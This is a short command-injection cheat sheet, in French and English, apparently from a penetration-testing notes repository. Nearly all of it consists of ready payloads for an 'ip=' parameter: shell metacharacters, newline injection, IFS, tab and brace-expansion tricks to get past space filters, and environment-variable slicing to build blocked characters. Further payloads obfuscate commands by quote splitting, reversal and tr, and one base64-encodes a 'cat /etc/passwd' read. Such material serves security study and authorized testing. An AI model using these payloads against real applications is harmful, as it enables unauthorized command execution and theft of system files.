# Command Injection (OSi)

L'injection de commandes (Code Execution) est l'abus du comportement d'une application pour exécuter des commandes sur le système d'exploitation.

- L'injection de commande détaillée se produit lorsque l'application vous donne un retour ou une sortie sur ce qui se passe ou est en cours d'exécution.


## Injection Character
Divers métacaractères de shell peuvent être utilisés pour effectuer des attaques par injection de commande:

> Always try URL-Encoded Character

```sh
;
&
&&
||
|
``
\n -> %0a
$()
```

## Filter Evasion


[Plus de filtre](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#bypass-without-space)

[Evasion Tools](./Evasion%20Tools.md)

**Bypassing Space Filters**

```sh
# Bypass Blacklisted Operators
ip=127.0.0.1%0a
ip=127.0.0.1%0a+
ip=127.0.0.1%0awhoami
ip=127.0.0.1%0a+whoami

# Using Tabs %09
ip=127.0.0.1%0a%09

# Using IFS
ip=127.0.0.1%0a${IFS}

# Using Brace Expansion
ip=127.0.0.1%0a{ls,-la}
```

**Bypassing Other Blacklisted Characters**

Like `slash /` or `backslash \` characters

```sh
ip=127.0.0.1%0a${PATH:0:1}${IFS}
ip=127.0.0.1%0a${LS_COLORS:10:1}${IFS}

ip=127.0.0.1${PATH:0:1}${IFS}
ip=127.0.0.1${LS_COLORS:10:1}${IFS}
ip=127.0.0.1$(tr '!-}' '"-~'<<<[)

# Windows
ip=127.0.0.1%HOMEPATH:~6,-11%
ip=127.0.0.1$env:HOMEPATH[0]
ip=127.0.0.1$env:PROGRAMFILES[10]
```

**Bypassing Blacklisted Commands**

When we have successfully bypassed the character filter.

```sh
ip=127.0.0.1%0aw'h'o'am'i
ip=127.0.0.1%0aw"h"o"am"i
ip=127.0.0.1%0aw\ho\am\i
ip=127.0.0.1%0awho$@ami

# Windows
ip=127.0.0.1%0awho^ami
```

**Advanced Command Obfuscation**

```sh

ip=127.0.0.1%0a$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")
ip=127.0.0.1%0a$(tr%09"[A-Z]"%09"[a-z]"<<<"WhOaMi")
ip=127.0.0.1%0a$(rev<<<'imaohw')

# Windows
ip=127.0.0.1%0aWhOaMi
ip=127.0.0.1%0aiex "$('imaohw'[-1..-20] -join '')"

# Encoded Commands
echo -n 'cat /etc/passwd | grep 33' | base64 #Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==

ip=127.0.0.1%0abash<<<$(base64+-d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw%3d%3d
```

